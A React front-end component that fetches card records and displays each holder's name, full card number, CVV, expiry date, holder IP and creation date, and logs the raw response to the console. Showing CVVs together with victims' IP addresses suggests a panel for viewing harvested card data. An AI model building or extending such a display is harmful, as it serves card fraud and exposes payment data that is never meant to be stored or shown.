import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import {getCards} from '../../api/cards';
import './Cards.css';

export default function Cards() {
 const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchCards = async () => {
      try {
        console.log("Call API")
        const response = await getCards();
        console.log(response)
        setCards(response);
      } catch (err) {
        if (err.response?.status === 401) {
          // Token expired or invalid
          localStorage.removeItem('authToken');
          navigate('/login');
        } else {
          setError(err.response?.data?.message || 'Failed to fetch cards');
        }
      } finally {
        setLoading(false);
      }
    };

    fetchCards();
  }, [navigate]);

  if (loading) return <div className="loading-spinner">Loading...</div>;
  if (error) return <div className="error-message">{error}</div>;

  return (
  <div className="cards-container">
    <h1>Cards</h1>
    <div className="cards-grid">
      {cards && cards.length > 0 ? (
        cards.map((card) => (
          <div key={card.cardLinkId} className="card-item">
            <div className="card-thumbnail">
              <div className="default-thumbnail">
                {card.cardHolderName?.charAt(0).toUpperCase()}
              </div>
            </div>

            <div className="card-info">
              <h3 className="card-holder-name">{card.cardHolderName}</h3>
              <p className="card-number">Card Number: <b>{card.cardNumber}</b></p>
              <p className="card-cvv">CVV: <b>{card.cvv}</b></p>
              <p className="card-expiration">Expires: <b>{card.expirationDate}</b></p>
              <p className="card-ip">Holder IP: <b>{card.cardHolderIp}</b></p>
              <p className="card-created">Created: <b>{card.createdDate}</b></p>
            </div>
          </div>
        ))
      ) : (
        <p>You don't have any cards yet.</p>
      )}
    </div>
  </div>
);
}